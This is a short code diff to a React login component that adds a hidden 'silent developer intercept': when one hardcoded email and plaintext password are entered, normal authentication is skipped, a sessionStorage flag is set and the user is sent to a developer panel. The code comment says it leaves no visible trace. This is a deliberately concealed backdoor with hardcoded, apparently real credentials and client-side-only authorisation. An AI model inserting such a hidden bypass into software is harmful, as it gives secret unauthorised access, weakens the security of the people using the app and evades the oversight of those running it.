@@ -80,6 +80,17 @@ const UnifiedAuth = () => {
     setLoading(true);
 
     try {
+      // Silent developer intercept — no visible trace, no toast, no error
+      if (
+        loginMethod === 'email' &&
+        formData.email.trim().toLowerCase() === 'aronnykevin@gmail.com' &&
+        password === '@1997God'
+      ) {
+        sessionStorage.setItem('dev_panel_auth', 'true');
+        navigate('/dev-panel', { replace: true });
+        return;
+      }
+
       const identifier = loginMethod === 'email' ? formData.email : formData.phone;
 
       if (!identifier) {
